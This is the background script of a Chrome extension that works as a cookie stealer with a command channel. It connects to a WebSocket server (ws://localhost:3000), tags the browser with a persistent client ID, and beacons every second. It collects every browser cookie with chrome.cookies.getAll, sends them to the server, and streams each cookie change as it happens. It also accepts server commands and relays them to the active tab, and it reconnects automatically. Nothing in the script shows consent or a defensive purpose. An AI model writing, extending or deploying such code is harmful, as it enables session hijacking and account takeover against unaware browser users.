let ws;
let client_id;

function connectWebSocket() {
  ws = new WebSocket("ws://localhost:3000");

  ws.addEventListener("open", () => {
    console.log("WebSocket connected");
    chrome.storage.local.get("client_id", (data) => {
      client_id = data.client_id;
      if (!client_id) {
        client_id = Math.random().toString(36).substring(7);
        chrome.storage.local.set({ client_id });
      }
      send("alive", {
        client_id,
        os: "windows",
        username: "user",
      });
      chrome.cookies.getAll({}, function (cookies) {
        ws.send(JSON.stringify(["setcookies", cookies]));
      });
      setInterval(() => {
        send("alive", {
          client_id,
          os: "Windows",
          username: "user",
        });
      }, 1000);
    });
  });
  ws.addEventListener("message", handleMessages);
  ws.addEventListener("close", () => {
    console.log(
      "WebSocket disconnected, attempting to reconnect in 1 seconds..."
    );
    setTimeout(() => {
      connectWebSocket();
    }, 1000);
  });
}

connectWebSocket();

function handleMessages(message) {
  try {
    const data = JSON.parse(message.data);
    switch (data[0]) {
      case "alert":
        sendMessageToContentScript(JSON.stringify(["alert", data[1]]));
        break;
    }
  } catch (err) {
    console.error(err);
  }
}
function send(type, data) {
  if (ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify([type, data]));
  } else {
    console.log("WebSocket is not open");
  }
}
function sendMessageToContentScript(message) {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    let activeTab = tabs[0]; // Get the active tab
    chrome.tabs.sendMessage(activeTab.id, { message: message }, (response) => {
      console.log("Response from content script:", response);
    });
  });
}

chrome.cookies.onChanged.addListener(function (changeInfo) {
  ws.send(JSON.stringify(["updatecookie", changeInfo.cookie]));
});
